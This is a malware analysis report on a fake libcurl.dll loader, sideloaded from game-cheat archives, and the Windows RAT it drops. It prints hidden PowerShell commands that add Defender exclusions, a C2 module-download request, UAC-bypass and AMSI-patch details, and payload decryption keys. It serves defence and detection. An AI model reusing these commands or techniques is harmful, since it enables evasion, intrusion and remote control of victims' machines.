# Sideloaded fake libcurl.dll loader and native Windows RAT

## Key findings

- A fake `libcurl.dll` ships in fake game-cheat archives. In 22 of 29, the genuine Notepad++ updater, renamed, sideloads it; in the other seven it sits beside another executable.
- The DLL demands administrator rights, adds Defender exclusions, decrypts an embedded payload into `%TEMP%` and runs it. Builds from 2026-08-11 to 2026-09-28 use five payload encryption schemes.
- Payloads built 2026-08-07 to 2026-09-15 are a native x64 RAT that maps C2-supplied modules into a hidden `cmd.exe`. Builds from 2026-09-18 are a second type, from another toolchain, with the same strings, config and C2 hello.
- Every RAT and second-type payload starts with a six-check environment gate that exits silently on a hypervisor CPUID, VM drivers or devices, a virtual display adapter or a slow display.
- Past the gate, both types install to `C:\ProgramData`, create four scheduled tasks and hold a WebSocket session on TCP 406, opened with `ready;<C: volume serial>;version;1.0.0`. C2 hosts by build date: 145.63.134.94 (2026-08-07), 45.91.202.146 (2026-08-21 to 2026-09-25), `mops.to` (from 2026-09-27).

```
RAR/ZIP on MediaFire (password-protected; links in YouTube videos)
 └─ FortniteHack.exe / Loader.exe / Main.exe / Setup.exe ... = WinGup for Notepad++ 5.31 (gup.exe, Notepad++-signed);
     absent from 7 of the 29 archives
     └─ sideloads libcurl.dll (curl_easy_init does the work)
         ├─ not admin -> MessageBoxA "run with administrator rights" -> ExitProcess(0)
         ├─ cmd.exe /C: Add-MpPreference (2 or 4 commands), gpupdate /force
         ├─ base64 + XOR | ChaCha20-Poly1305 | SipHash CTR | XOR keystream + XXTEA | AES-256-CBC
         └─ %TEMP%\<12 alphanumerics>.exe -> CreateProcessW -> ExitProcess(0)
             ├─ Sleep(500) + six checks; any hit -> ExitProcess(0)
             ├─ copy to C:\ProgramData\Windows\Microsoft\RuntimeBroker[A].exe, four scheduled tasks
             ├─ RAT (payloads 08-07 to 09-15): host | cached host | 64 DuckDNS names -> WebSocket on TCP 406
             │    module: GET /task/<type> (TCP 408) -> registry cache -> hidden cmd.exe
             └─ second type (payloads 09-18 to 10-11): same config, same hello on TCP 406
```

## 1. Host and distribution

In `Belium.rar`, both Quantum archives, `Loader.zip`, one `mpclient.zip`, `AxiomCheat.rar`, `Executor.zip`, `Nexus.zip` and `Setup_v14.26.01.zip`, the host is WinGup for Notepad++ 5.31 (`gup.exe`, 804,688 B), signed with a DigiCert-issued certificate whose subject CN is `Notepad++`. It ships with `gup.xml` as `Belium.exe`, `Executor.exe`, `Loader.exe`, `Main.exe`, `Setup.exe` or a cheat name such as `Quantum V4.exe`, and imports `libcurl.dll` by name, so the copy in the application folder loads.

`Leak.rar` and the first `Kapu.rar` (5efc4b94) hold the loader as `CLibrary.dll` or `Sentlog.dll` next to a signed Go 1.22.1 executable (`Menu.exe`, or `Lоаdеr.exe` spelled with Cyrillic letters) and no WinGup copy. Both `Kapu.rar` archives carry `gup.xml` renamed `Environment.ini.xml`; the second holds `Sentlog.dll` next to a different, 4,172,216-byte executable with the same Cyrillic name. The other `mpclient.zip` holds `library\libcurl.dll` and `library\gup.xml` next to a signed Go 1.19.11 `Setup.exe`, also without WinGup. `InstallerV_2026_8.13.rar` holds `libcurl.dll` and `gup.xml` next to `invertor.exe` and three DLLs, also without WinGup.
In 13 of the 15 archives that carry the other twelve builds, the same WinGup (`eaac64c1`) sits next to `libcurl.dll` and `gup.xml`, renamed after the bait: `FortniteHack.exe`, `!RustiX.exe`, `ValorantHack.exe`, `Installer3.9.exe`, `Flexmode v3.22.exe`, `Main.exe` (`DEX_v1.2.rar`), `KernelV2.exe`, `Anvil.exe`, `ArcaneRBX.exe`, `Spectra_Menu.exe`, `ultra_trainer_v2.6.exe`, `!PalworldExtreme.exe` and `!lnstaIIer.exe` (lower-case L, capital Is). Loader a16ac85e ships in four of them. `Xeno-v1.3.60.rar` holds its loader as `Xeno.dll` beside `Xeno-v1.3.60.exe`, and `XenoExecutor.rar` holds `libcurl.dll` beside `Main.exe`; neither carries WinGup.

Video-stated archive passwords: `123` (`Leak.rar`, first `Kapu.rar`), `mpclient`, `gamemenu26` (`Loader.zip`), `Quantum`, `Quantumcheats`, `AxiomCheat`, `321` (`Executor.zip`), `3344` (`InstallerV_2026_8.13.rar`), `772277` (`Nexus.zip`) and `2026` (`Setup_v14.26.01.zip`). Both `mpclient.zip` archives use AES-256 ZIP encryption.

## 2. Loader

| Loader | Size | Built (UTC) | Rich XOR key | Payload scheme |
|---|---|---|---|---|
| 495d877c | 1,844,736 B | 2026-08-11 10:38:38 | 0x17349AF0 | base64 + 32-byte XOR, two blobs |
| f35cd549 | 1,264,640 B | 2026-08-21 11:20:20 | 0xD8C4BDBB | base64 + ChaCha20-Poly1305 |
| c6c9791f | 1,291,264 B | 2026-08-22 16:28:59 | 0xD8C4BDBB | base64 + ChaCha20-Poly1305 |
| 576f297b | 1,270,272 B | 2026-08-23 12:47:11 | 0xD8C4BDBB | base64 + ChaCha20-Poly1305 |
| 60e51b8b | 1,254,400 B | 2026-08-24 16:31:40 | 0xD8C4BDBB | base64 + ChaCha20-Poly1305 |
| d52f40f6 | 1,286,144 B | 2026-08-28 12:12:15 | 0xD8C4BDBB | base64 + SipHash-2-4 CTR |
| f43c501e | 928,256 B | 2026-08-29 07:44:25 | 0xD4CE979F | base64 + SipHash-2-4 CTR |
| 927af2a9 | 662,528 B | 2026-09-04 10:47:22 | 0x50DF3DA5 | XOR keystream + XXTEA |
| a222956e | 662,528 B | 2026-09-04 14:57:38 | 0x50DF3DA5 | XOR keystream + XXTEA |
| 9a0bb43d | 823,296 B | 2026-09-11 10:05:23 | 0xDA6D4075 | base64 + AES-256-CBC |
| 026f9106 | 834,560 B | 2026-09-14 21:11:17 | 0xDA6D4075 | base64 + AES-256-CBC |
| 340cedbd | 828,416 B | 2026-09-15 16:27:50 | 0xDA6D4075 | base64 + AES-256-CBC |
| 45335d65 | 1,132,544 B | 2026-09-18 18:29:36 | 0xDA6D4075 | base64 + AES-256-CBC |
| 196006c0 | 997,888 B | 2026-09-18 18:30:08 | 0xDA6D4075 | base64 + AES-256-CBC |
| 336cd428 | 1,062,912 B | 2026-09-18 23:47:04 | 0xDA6D4075 | base64 + AES-256-CBC |
| 2ffa9d2a | 1,012,224 B | 2026-09-19 10:06:32 | 0xDA6D4075 | base64 + AES-256-CBC |
| 37383dd6 | 1,293,312 B | 2026-09-23 20:35:19 | 0xDA6D4075 | base64 + AES-256-CBC |
| 7135da14 | 2,993,664 B | 2026-09-25 19:09:49 | none | base64 + AES-256-CBC, IV and key after the blob |
| be4d6b8d | 2,580,992 B | 2026-09-27 19:25:19 | none | same |
| e0e99a6b | 2,981,888 B | 2026-09-27 21:52:54 | none | same |
| a2627976 | 3,390,976 B | 2026-09-28 07:37:12 | none | same |
| a16ac85e | 2,370,560 B | 2026-09-28 08:42:19 | none | same |

All 22 are unsigned x64 DLLs. The 17 builds up to 2026-09-23 come from the MSVC 14.44 linker; the AES builds add bcrypt and CRYPT32 imports. They export only the four `curl_easy_*` functions that WinGup imports, except f43c501e, which exports 12 `curl_*` names. In 927af2a9, `curl_easy_init` (0x180002510) holds all the logic and the other three point to a bare `ret`. The five builds from 2026-09-25 come from linker 14.0 with no Rich header, export 10 to 20 `curl_*` names and carry fake version info (company `Microsoft Corporation`, `Microsoft (R) Windows (R)` or `MS Windows Platform`; descriptions such as `Windows System Component`; original file name `curl.dll`, `libcurl.dll` or `curlssl.dll`). In 7135da14, `curl_easy_init` calls a flattened routine that references the blob, key, IV and the temp-path, file-write and `CreateProcessW` wrappers, and the admin message text is XOR-decoded at run time, so a plaintext string scan misses it. Each payload was compiled 5 to 32 s before its loader, so one script probably builds both (inferred). 495d877c is the exception: its payloads are about four days older.

`curl_easy_init` runs three steps:

1. `AllocateAndInitializeSid` plus `CheckTokenMembership`. A non-admin gets `MessageBoxA("run with administrator rights", "Error", MB_ICONERROR)`, then `ExitProcess(0)`.
2. `cmd.exe /C` via `CreateProcessA` with CREATE_NO_WINDOW, waiting up to 20 s, 20 s and 30 s:
   - `powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:TEMP"`
   - `powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData','C:\ProgramData\Windows\Microsoft','C:\ProgramData\Microsoft\Windows'"`
   - `gpupdate /force`
3. Decrypt the payload, write it to `GetTempPathW` + 12 random `[a-zA-Z0-9]` + `.exe` with `_wfopen_s`/`fwrite`, start it with `CreateProcessW`, then `ExitProcess(0)`, which also ends the host.

There is no `VirtualAlloc` or `VirtualProtect`: the loader only drops and runs. Commands are stack-built or single-byte XORed (0x38 in 927af2a9). Their text is identical in 927af2a9 and 340cedbd; the other 2026-09 builds share their imports and admin string (inferred to behave the same).

Run with administrator rights as `rundll32 libcurl.dll,curl_easy_init`, 495d877c started these children in order, each about 1 s after the previous one:

- `cmd.exe /C powershell -Command "Add-MpPreference -ExclusionPath $env:TEMP"`
- the same for `'C:\ProgramData'`, `'C:\ProgramData\Windows\Microsoft'` and `'C:\ProgramData\Microsoft\Windows'`, one command each
- `cmd.exe /C gpupdate /force`
- 10.4 s later, `%TEMP%\96BAkuZ431Sf.exe`, which is 0b99c3e8

The loader exited with code 0 at 14.3 s. 0b99c3e8 exited within about a second, without a DNS query or connection (section 8).

## 3. Payload decryption

927af2a9: the 531,456-byte blob at VA 0x18001bb40 (file 0x1a940) starts `ce f4 ed 84 cb fd 17 06`. a222956e uses the same code and offsets with its own table, key and blob, which starts `1b e9 94 15 e8 0c 6b 4b`.

1. Layer 1 (loop 0x180001260): `p[i] = c[i] ^ ((7*(i & 0xFF) + 0x0D) & 0xFF) ^ TBL[i % 48]`, with the table at VA 0x18009d7f0.
2. Layer 2 (0x180001360 to 0x180001417): standard XXTEA decryption, 0x20700 words, 6 rounds, delta 0x9E3779B9, initial sum 0xB54CDA56. Four `mov dword [rsp+0x30..0x3c]` immediates from 0x180001292 build the key.

The output keeps the blob's length and ends in zero bytes: 152 in 927af2a9, 144 in a222956e.

The eight MSVC AES builds keep the base64 blob at file 0x17900 (VA 0x180018b00), decoded by `CryptStringToBinaryA`. BCrypt decrypts it with `L"AES"`, `ChainingModeCBC` and BCRYPT_BLOCK_PADDING. The `lea` at 0x180001339 points to the 32-byte key, which starts where the base64 text ends, or 4 bytes later in 9a0bb43d, 45335d65 and 336cd428. The `movups` at 0x180001363 loads the IV, 0xF8 bytes after the key, or 0x100 in 196006c0 and 2ffa9d2a.

495d877c holds two base64 blobs. Each is XORed with its own 32-byte key, which is itself a 44-character base64 literal assigned by an initializer registered with `atexit`. Blob 2 (file 0xffe9b to 0x1ad3f3, key literal at file 0xffe6e) gives 0b99c3e8. Blob 1 (file 0x2b66d to 0xffe6d, key literal at file 0x2b640) gives 59b05b87; its decrypt routine (0x180003510) has no code reference.

f35cd549, c6c9791f, 576f297b and 60e51b8b: base64, then ChaCha20-Poly1305 as in RFC 8439, with no associated data. The code holds the `expand 32-byte k` constant, a Poly1305 over 26-bit limbs and a tag compare. All four keep the key at file 0x5a080, the 12-byte nonce at 0x5a0a0, the tag at 0x5a0b0 and the base64 text from 0x5a0c0; f35cd549 takes the text length from the immediate 0xae000. Every tag verifies.

d52f40f6 and f43c501e: base64, then XOR with a counter-mode keystream whose block *i* is SipHash-2-4 with 128-bit output over `LE64(nonce) || LE64(i)`, from *i* = 0. d52f40f6 keeps the 16-byte key at file 0x57668, the nonce at 0x57678 and 707,928 base64 characters from 0x57680. f43c501e keeps the key at file 0xc7750 and 0xAC800 characters at file 0x1ae80; its nonce is an immediate.

The five builds from 2026-09-25: base64 via `CryptStringToBinaryA`, then BCrypt AES-256-CBC with PKCS#7 padding. Two `lea` operands point past the base64 text: first the 16-byte IV, at the text's end or 8 bytes later, then the 32-byte key.

| Loader | Payload | Size | Built (UTC) | Type |
|---|---|---|---|---|
| 495d877c | 0b99c3e8 | 532,480 B | 2026-08-07 02:58:49 | RAT |
| 495d877c | 59b05b87 | 652,800 B | 2026-08-07 00:45:38 | injector |
| f35cd549 | bb8170db | 534,528 B | 2026-08-21 11:20:09 | RAT |
| c6c9791f | 12b6d813 | 526,336 B | 2026-08-22 16:28:48 | RAT |
| 576f297b | 5645fcb8 | 525,824 B | 2026-08-23 12:46:58 | RAT |
| 60e51b8b | dfdc9212 | 526,848 B | 2026-08-24 16:31:30 | RAT |
| d52f40f6 | 25f2cf02 | 530,944 B | 2026-08-28 12:12:04 | RAT |
| f43c501e | 77392882 | 529,920 B | 2026-08-29 07:44:13 | RAT |
| 927af2a9 | c9a4b842 | 531,456 B | 2026-09-04 10:47:11 | RAT |
| a222956e | 84f02f88 | 531,456 B | 2026-09-04 14:57:27 | RAT |
| 9a0bb43d | a664c2a7 | 529,408 B | 2026-09-11 10:05:13 | RAT |
| 026f9106 | 7e4492b5 | 538,112 B | 2026-09-14 21:11:08 | RAT |
| 340cedbd | a2d54387 | 533,504 B | 2026-09-15 16:27:40 | RAT |
| 45335d65 | 88c6aa93 | 761,344 B | 2026-09-18 18:29:31 | second type |
| 196006c0 | a79ca6cf | 660,480 B | 2026-09-18 18:30:03 | second type |
| 336cd428 | 3ea2e982 | 709,120 B | 2026-09-18 23:46:59 | second type |
| 2ffa9d2a | 97c4b964 | 671,232 B | 2026-09-19 10:06:27 | second type |
| 37383dd6 | c61e689f | 882,176 B | 2026-09-23 20:35:14 | second type |
| 7135da14 | e4f40bf1 | 768,512 B | 2026-09-25 19:09:26 | second type |
| be4d6b8d | 8451cbfb | 639,488 B | 2026-09-27 19:25:04 | second type |
| e0e99a6b | 8f93b9ab | 711,168 B | 2026-09-27 21:52:31 | second type |
| a2627976 | 04020b58 | 722,432 B | 2026-09-28 07:36:40 | second type |
| a16ac85e | 8b38b33a | 634,368 B | 2026-09-28 08:42:04 | second type |

## 4. RAT build, obfuscation and config

The RATs are x64 GUI PEs from the MSVC 14.44 linker, with 69 KERNEL32 imports and nothing else static. All 12 RAT builds share Rich XOR key 0xB716F6F5 and imphash 7f972135. Other APIs are resolved with `GetProcAddress` on decoded names.

Sections: `.text`, `.rdata`, `.data`, `.pdata` (entropy 7.68 to 7.76, no usable unwind data), `.CRT`, an unnamed section (characteristics 0x68000020) and `.reloc`. In a2d54387:

- The entry point 0x1400176d0 is `call 0x14004e817`, into the head region of the unnamed section. In c9a4b842 the entry point 0x140016ce0 is `call 0x14005ed43`, past its record table in the same section.
- A 7,365-byte code region (0x14004e000 to 0x14004fcc5) precedes a 4-byte record count, 11,897, and then 11,897 six-byte records `{u32 rva; u16 size}` (c9a4b842: 1,515 B, then 11,918). The region is code, not ciphertext, with no embedded PE.
- `.text` uses mixed arithmetic such as `-0x49e4170d - (-0x49e4170e - x)`, which is `x + 1`.

Strings: each has its own decoder, `p[i] = ROTR8(c[i], (i % 7) + 1) ^ ((0x0D*i + ADD) & 0xFF)` until zero. Wide strings use the low byte. ADD is set per build (table below). The pool layout is identical across RAT builds. Task and chunk keywords stay plaintext, for example `createtask`, `task_done` and `%s_%s_chunk_%d`.

Config, filled by the initialiser at 0x140001000 (a2d54387 addresses):

| Field | Value | Cipher VA |
|---|---|---|
| Drop path | `C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe` | 0x14002e2c4 |
| Host | `45.91.202.146` | 0x14002e32a |
| Ports | `406` (WebSocket session, DGA), `408` (task download) | 0x14002e346, 0x14002e34a |
| Campaign ID | `5385386367` | 0x14002e34e |
| Version | `1.0.0` | 0x14002e359 |
| DGA | `lav`, `ini` (plaintext), `.duckdns.org` | 0x14002f06a |
| Mutex string | `Global\RuntimeBrokerAds` | 0x14002f088 |

Every payload except 59b05b87 carries this field set. Only the ADD, the campaign ID and the host change, plus an `A` suffix in three second-type builds on the drop file, mutex and task names (`RuntimeBrokerA.exe`, `Global\RuntimeBrokerAdsA`, `ProgramDataUpdateA` and the other three):

| Payload | Type | Built (UTC) | ADD | Campaign ID | Host |
|---|---|---|---|---|---|
| 0b99c3e8 | RAT | 2026-08-07 | 0xE9 | `734373268` | 145.63.134.94 |
| bb8170db | RAT | 2026-08-21 | 0xC2 | `8075828874` | 45.91.202.146 |
| 12b6d813 | RAT | 2026-08-22 | 0xB5 | `8539037846` | 45.91.202.146 |
| 5645fcb8 | RAT | 2026-08-23 | 0xB9 | `7825042957` | 45.91.202.146 |
| dfdc9212 | RAT | 2026-08-24 | 0xB5 | `5452184530` | 45.91.202.146 |
| 25f2cf02 | RAT | 2026-08-28 | 0xB6 | `7213036010` | 45.91.202.146 |
| 77392882 | RAT | 2026-08-29 | 0xD0 | `8617297373` | 45.91.202.146 |
| c9a4b842 | RAT | 2026-09-04 | 0xC8 | `8244555580` | 45.91.202.146 |
| 84f02f88 | RAT | 2026-09-04 | 0xBB | `8539037846` | 45.91.202.146 |
| a664c2a7 | RAT | 2026-09-11 | 0xCE | `8900439480` | 45.91.202.146 |
| 7e4492b5 | RAT | 2026-09-14 | 0xB9 | `6487060672` | 45.91.202.146 |
| a2d54387 | RAT | 2026-09-15 | 0xB8 | `5385386367` | 45.91.202.146 |
| 88c6aa93 | second | 2026-09-18 | 0xAF | `8408753908` | 45.91.202.146 |
| a79ca6cf | second | 2026-09-18 | 0xAF | `8617297373` | 45.91.202.146 |
| 3ea2e982 | second | 2026-09-18 | 0xDD | `1046936026` | 45.91.202.146 |
| 97c4b964 | second | 2026-09-19 | 0xF3 | `5385386367` | 45.91.202.146 |
| c61e689f | second | 2026-09-23 | 0x89 | `8610664001` | 45.91.202.146 |
| e4f40bf1 | second | 2026-09-25 | 0x9C | `7025928280` | 45.91.202.146 |
| 8451cbfb | second | 2026-09-27 | 0xA5 | `8247900949` | `mops.to` |
| 8f93b9ab | second | 2026-09-27 | 0x98 | `8270706215` | `mops.to` |
| 04020b58 | second, A | 2026-09-28 | 0xE7 | `8836297756` | `mops.to` |
| 8b38b33a | second, A | 2026-09-28 | 0xD4 | `8255795073` | `mops.to` |
| 9c1f879d | second, A | 2026-10-11 | 0x8B | `8566837496` | `mops.to` |

Campaign IDs repeat across builds: `8539037846` in two RAT builds with different encryption schemes, and `8617297373` and `5385386367` each in one RAT and one second-type build. So it does not identify a build. `734373268` is a nine-character literal whose slot is one byte shorter than in the ten-digit builds, not a truncation.

## 5. C2 selection, cache and DGA

The selector (0x140015df0) takes a host and port:

1. Test the host 5 times, 30 s apart; on success, cache it.
2. Else test the cached host 5 times, 30 s apart.
3. Else keep testing both in two threads while looping the DGA on port 406, pausing 200 ms after each failed candidate. The first to answer is cached.

A host test is a non-blocking TCP connect with a 3 s limit. A DGA candidate must accept a TCP connection on port 406 and the WebSocket upgrade, receive `checkserver;<client ID>;<nonce>` and send back one frame. The nonce comes from xorshift64 seeded with `GetTickCount64`, a stack address and `RDTSC`. The cache is key `HKCU\Software\Microsoft\EventSystem`, value `System`, REG_SZ. The DGA joins six `lav`/`ini` fragments plus `.duckdns.org`: 64 fixed names.

At runtime the configured host came first. 0b99c3e8 made a bare connect-and-close to 145.63.134.94:406 (the host test), then opened its session there, 0.1 s after starting. It stored `145.63.134.94` in the cache value. 8b38b33a did the same with `mops.to`, resolving it before every connection, and stored `mops.to`. Neither touched port 408 or a DGA name in six minutes.

## 6. Session protocol

The session routine (0x140010480) uses raw Winsock:

1. `GET / HTTP/1.1\r\nHost: <host>\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n` (the RFC 6455 sample key). The request line and the header block are separate strings with adjacent decoders; that they are joined around the host is inferred.
2. `ready;<client ID>;version;1.0.0`. The client ID is the `C:\` volume serial as 8 lower-case hex characters.
3. `ping` gets `pong`. `getinfo` gets `info;<AV>;<OS>;<user>;<campaign ID>`, with `unknown` for empty fields. AV names come from WMI `AntiVirusProduct` and `AntiSpywareProduct` in `ROOT\SecurityCenter2` and `ROOT\SecurityCenter`; the OS and user fields are inferred from the APIs.
4. Messages that start with `task` go to the task parser; others are ignored. If no `ping` arrives for 90 s, or a connect or send fails, the session ends and the RAT reconnects after 5 s.

Client frames are `0x82` (FIN, binary), then `0x80 | length` (with the 126 and 127 extended forms), then the masking key, then the payload XORed with that key. The RAT's key is fixed, `12 34 56 78`; 8b38b33a used a different key in each session.

Both payloads sent exactly the request above, then one binary frame, `ready;<C: volume serial>;version;1.0.0`. Neither sent the campaign ID. With no command or `ping` from the server, each session closed about 90.5 s after the hello and reconnected 5.1 to 5.4 s later, matching the timers in step 4: four sessions per run.

## 7. Tasks and module execution

The parser reads `task_id;`, `createtask` or `closetask`, `type;`, `version;` and `param;`.

- `createtask` first checks `HKCU\Software\WinRAR\Libs` for chunk values named `%s_%s_chunk_%d`. On a miss it connects to the configured host (45.91.202.146 in a2d54387) on port 408 and sends `GET /task/%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n` (buffer cap 0x300000 B), then stores the module as chunks.
- To run a module, it starts `C:\Windows\System32\cmd.exe` with CREATE_SUSPENDED | CREATE_NO_WINDOW and SW_HIDE, resumes it and waits 500 ms. It copies the module's headers and sections into one RWX allocation of SizeOfImage. It writes the `param;` string and a 0x38-byte context (`LoadLibraryA`, `GetProcAddress`, `RtlAddFunctionTable`, image base, parameter pointer) to RW memory and a stub to RWX memory, then starts a remote thread on the stub. It uses `NtAllocateVirtualMemory`, `NtWriteVirtualMemory` and `NtCreateThreadEx`, resolved by name, and makes up to two attempts. The stub's relocation and import handling is inferred.
- `param;update` sends `task_done;<id>`, calls `RtlSetProcessIsCritical(FALSE)` and exits: a self-update (inferred).
- `createtask` records the host `cmd.exe` process ID under the task ID in memory. `closetask` terminates that process (`TerminateProcess`, exit code 1); if that succeeds, it waits up to 3 s and drops the record.

## 8. Other capabilities

This code is present in the RAT; the install steps were also observed at runtime.

- UAC bypass: the RAT rewrites its PEB image path, command line and loader entry names to `<Windows directory>\explorer.exe`, binds `Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` (CMSTPLUA) with the ICMLuaUtil interface ID, calls vtable offset 0x48 (`ShellExec`) and exits.
- AMSI: overwrites the first 3 bytes of `AmsiOpenSession` with `48 31 c0`.
- Enables `SeDebugPrivilege`, `SeAssignPrimaryTokenPrivilege` and `SeIncreaseQuotaPrivilege`, then `RtlSetProcessIsCritical(TRUE)`.
- Runs hidden `cmd.exe /C powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Windows\Microsoft','C:\ProgramData\Microsoft\Windows'" && gpupdate /force`. In 0b99c3e8's run the installed copy ran it.
- Creates four scheduled tasks (listed under Indicators). Three use a boot trigger with no delay, `PT5S` or `PT15S`; the fourth uses a time trigger that starts at creation and repeats every 30 minutes (`PT30M`). Each task runs the installed copy with highest available privileges and no execution time limit. Both runs created all four; 8b38b33a's names end in `A`.
- Copies itself to the drop path and starts the copy. The started payload exited within 50 ms in both runs, and the copy ran on as `RuntimeBroker.exe` or `RuntimeBrokerA.exe`.
- Registers window class `winlogon`, title `smartscreen` (inferred from argument shapes).
- Environment gate (0x140005c90 in 0b99c3e8, 0x1400046d0 in all 11 second-type builds): `Sleep(500)`, then six checks, each calling `ExitProcess(0)` on a hit:
  1. `EnumDisplaySettingsW` refresh rate below 50 Hz.
  2. 21 VM driver names via `GetModuleHandleA`.
  3. `CreateFileA` on `\\.\VBoxMiniRdrDN`, `\\.\HGFS` and `\\.\prl_usb_mouse`.
  4. CPUID hypervisor vendor (`KVMKVMKVM`, `VMwareVMware`, `XenVMMXenVMM`, `prl hyperv `, `VBoxVBoxVBox`, `QEMU`) and brand words (`Hyper`, `Broadwell`, `EPYC`).
  5. 13 display adapter names, including `Microsoft Basic Render Driver` and `anyrun GPU`, plus vendor words and `d3d9.dll!Direct3DCreate9`.
  6. CPU words `Broadwell` and `G6900`.

  All 22 RAT and second-type payloads and 9c1f879d carry it; 59b05b87 does not. On a KVM guest, 0b99c3e8 passes checks 1 to 3 and exits with code 0 at 0x140004516 in check 4, with `KVMKVMKVM` (CPUID leaf 0x40000000) on the stack. A KVM-based sandbox therefore stops every payload before any network activity (inferred for the other builds).

## 9. Second payload type

Ten payloads built 2026-09-18 to 2026-09-28, and 9c1f879d, come from another toolchain. All are x64 GUI EXEs with linker version 14.0, no Rich header and imphash 694a10f9 (64 KERNEL32 imports, including `VirtualAlloc`, `WriteProcessMemory` and `CopyFileW`). Their DOS header `4d 5a 78 00 01 00` matches LLVM lld-link output (inferred). Sections include `.00cfg`, `.strenc` (512 B), `.tls` and `.rsrc`. Version info is fake and differs per build:

| Payload | OriginalFilename | FileDescription | ProductName |
|---|---|---|---|
| 88c6aa93 | `RuntimeBroker.exe` | Operating System Service Module | Windows Update Helper |
| a79ca6cf | `sihost.exe` | Operating System Service Module | System Configuration Utility |
| 3ea2e982 | `svchost.exe` | Windows System Component | Desktop Window Manager |
| 97c4b964 | `RuntimeBroker.exe` | Operating System Service Module | Performance Monitor Agent |
| c61e689f | `taskhostw.exe` | Windows Runtime Library | Performance Monitor Agent |
| e4f40bf1 | `RuntimeBroker.exe` | Operating System Service Module | Windows Update Helper |
| 8451cbfb | `RuntimeBroker.exe` | Windows System Component | System Configuration Utility |
| 8f93b9ab | `RuntimeBroker.exe` | Operating System Service Module | Windows Update Helper |
| 04020b58 | `svchost.exe` | Windows System Component | Desktop Window Manager |
| 8b38b33a | `sihost.exe` | Operating System Service Module | Desktop Window Manager |
| 9c1f879d | `RuntimeBroker.exe` | Operating System Service Module | Microsoft Runtime Service |

The RAT's string scheme decodes all eleven; ADD, campaign ID and host are in section 4. The decoded strings hold the RAT's ports `406` and `408`, drop path, mutex string, `.duckdns.org` suffix, WebSocket request strings, `/task` template and Defender command. Plaintext keeps the RAT's `%s_%s_chunk_%d` and `%s_%s_tempchunk_%d`. Builds up to 2026-09-25 use 45.91.202.146; from 2026-09-27 they use `mops.to`, and 04020b58, 8b38b33a and 9c1f879d add the `A` suffix. 97c4b964 shares campaign ID `5385386367` with RAT build a2d54387.

8b38b33a matched the RAT at runtime (sections 5, 6 and 8): it installed as `RuntimeBrokerA.exe` with the four `A` tasks, cached `mops.to` and sent the same upgrade and hello on 406. Only its per-session masking key differed. So this is the same RAT rebuilt with another toolchain (inferred from the matching runtime behaviour).

9c1f879d (605,696 B, built 2026-10-11 12:26:57) comes from a different fake `libcurl.dll`, 0cd47cbb (x64, 4,293,632 B, unsigned, 43 curl exports, imphash ee0d7170). In `Setupper.zip`, WinGup renamed `Setupper.exe` sideloads it. At runtime the DLL wrote 9c1f879d to `%TEMP%\<12 alphanumerics>.exe` within 0.6 s and started it; the child made no DNS query or connection, consistent with the gate (inferred).

## 10. Injector 59b05b87

495d877c's other blob decrypts to 59b05b87 (652,800 B, MSVC 14.38, imphash e0ac1d0d, built 2026-08-07 00:45:38, 2 h 13 min before 0b99c3e8). Its strings are plaintext:

- the RAT's anti-VM lists, plus `anyrun.sys`, `Microsoft Hv` and `QEMU Virtual version 2.5+`;
- wide `winlogon.exe` next to `OpenProcessToken`, `DuplicateTokenEx` and `ImpersonateLoggedOnUser`;
- wide `HKEY_*` root names and a `_count` value suffix;
- log lines `Registry path: `, `Process ID: `, `[inject] Injection status: ` and `[inject] Failed to inject: DLL data is not a valid PE file`.

It probably reads a DLL stored as registry chunks and injects it after taking winlogon's token (inferred). The loader's decrypt routine for this blob has no code reference.

## 11. Infrastructure

- 145.63.134.94 (0b99c3e8's host): RDAP on 2026-11-06 gives 145.63.134.0/25 (NET-3-120, PL), Podaon SIA, registered 2026-06-18, seven weeks before the payload build. PTR `145-63-134-94.poland.vps.ac`; AS210895 (podaon-pl-1, Podaon SIA) announces 145.63.134.0/24. Same registrant and PTR pattern as 45.91.202.146.
- 45.91.202.146: RDAP on 2026-09-19, 2026-10-07 and 2026-10-27 gives 45.91.202.128/25 (NET-3-34, NL), Podaon SIA, registered 2024-08-29. PTR `45-91-202-146.netherlands-3.vps.ac` on all three dates, a rented VPS (inferred). AS211381 (PODAON) announced 45.91.202.0/24 on 2026-10-07. TCP 408 accepted a connect-only probe on 2026-10-07.
- All 64 DGA names were NXDOMAIN at Google DoH on 2026-09-19, and at Google and Cloudflare DoH on 2026-10-07 and 2026-10-27. None appeared among 423,265 `duckdns.org` names in CT logs for 2026-09-07 to 2026-10-07. They were unregistered when checked.
- `mops.to` (host of the five builds from 2026-09-27): on 2026-11-05 and 2026-11-06, Google DoH returned A 196.251.122.57, and the domain's name servers are Cloudflare's. RDAP gives 196.251.122.0/24 (AFRINIC, SC), registered 2024-12-24; AS214351 (FEMO IT SOLUTIONS LIMITED) originates it.

## 12. Crypto material

Each value below decrypts its loader's blob to the payload listed in section 3.

| Value | Bytes | Location |
|---|---|---|
| XOR key, 495d877c blob 2 | `fd 40 89 bf a9 1d ef a4 83 f4 0c 60 98 42 65 6b d9 0d 5a d8 2e 16 0b 93 9b 43 ca 1c ae d7 0e c9` | base64 literal `/UCJv6kd76SD9AxgmEJla9kNWtguFguTm0PKHK7XDsk=` at VA 0x180100c6e |
| XOR key, 495d877c blob 1 | `ba 8d 48 c4 2a 02 13 97 04 e7 3b db d1 b6 33 c9 e4 a6 2b f6 90 89 b8 3b 5b 85 e6 ac 8f 94 6b 66` | base64 literal `uo1IxCoCE5cE5zvb0bYzyeSmK/aQibg7W4XmrI+Ua2Y=` at VA 0x18002c440 |
| ChaCha20 key, f35cd549 | `c4 66 f5 de ca f2 cf 2a 69 4d c9 a6 10 18 ee 90 ea c0 32 ce 5e 9d e3 9a 63 e1 d8 71 a0 d1 d2 07` | VA 0x18005b680 |
| ChaCha20 nonce, f35cd549 | `7b 8d d7 2b ba fe 6c 0c 87 62 3a 4b` | VA 0x18005b6a0 |
